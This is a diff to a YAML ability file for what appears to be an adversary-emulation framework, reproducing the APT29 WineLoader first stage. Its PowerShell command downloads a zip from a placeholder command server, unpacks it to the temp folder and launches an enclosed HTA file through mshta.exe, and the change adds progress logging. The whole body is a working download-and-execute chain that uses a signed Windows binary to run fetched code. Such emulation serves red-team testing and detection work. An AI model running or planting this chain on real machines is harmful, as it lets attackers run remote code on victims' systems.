@@ -1,32 +1,48 @@
 - id: wineloader-stage1-hta
-  name: WineLoader Stage 1 – HTA Delivery (Clean)
-  description: Simulating APT29 download pattern using PowerShell.
+  name: WineLoader Stage 1 – HTA Delivery (Fixed)
+  description: Simulating APT29 download pattern with enhanced logging and fixed braces.
   tactic: execution
   technique_id: T1218.005
   technique_name: "Signed Binary Proxy Execution: MSHTA"
   platforms:
     windows:
       psh:
-        command: |
+        command: | 
           $ErrorActionPreference = "Stop";
           $zip = "$env:TEMP\legal_doc.zip";
           $dir = "$env:TEMP\apt29_stage";
-
-          # Manual download simulation
+          
           try {
+              Write-Host "[*] Start execution";
               $headers = @{"file"="legal_doc.zip"};
               Invoke-WebRequest -Uri "#{server}/file/download" -Headers $headers -OutFile $zip;
               
-              if (Test-Path $zip) {
-                  if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
-                  Expand-Archive -Path $zip -DestinationPath $dir -Force;
-                  
-                  Start-Process "mshta.exe" -ArgumentList "`"$dir\invitation.hta`"";
-                  
-                  Write-Output "stage1_complete";
+              if (-not (Test-Path $zip)) { throw "Zip file download failed" }
+              Write-Host "[+] Zip downloaded: $zip";
+
+              if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
+              Expand-Archive -Path $zip -DestinationPath $dir -Force;
+              Write-Host "[+] Unzipped to: $dir";
+
+              Write-Host "[*] Directory content:";
+              Get-ChildItem -Path $dir | Select-Object Name | Out-String | Write-Host;
+
+              $htaPath = "$dir\invitation.hta";
+              if (-not (Test-Path $htaPath)) { throw "invitation.hta not found in $dir" }
+
+              Write-Host "[+] Running MSHTA: $htaPath";
+              $p = Start-Process "mshta.exe" -ArgumentList "`"$htaPath`"" -PassThru;
+              
+              if ($p) {
+                  Write-Host "[+] Process started. PID: $($p.Id)";
+                  Start-Sleep -Seconds 3;
+                  if ($p.HasExited) {
+                      Write-Host "[!] MSHTA exited immediately. Code: $($p.ExitCode)";
+                  }
               }
+              Write-Output "stage1_complete";
           } catch {
-              Write-Error $_.Exception.Message;
+              Write-Error "Error: $($_.Exception.Message)";
               exit 1;
           }
         payloads: []
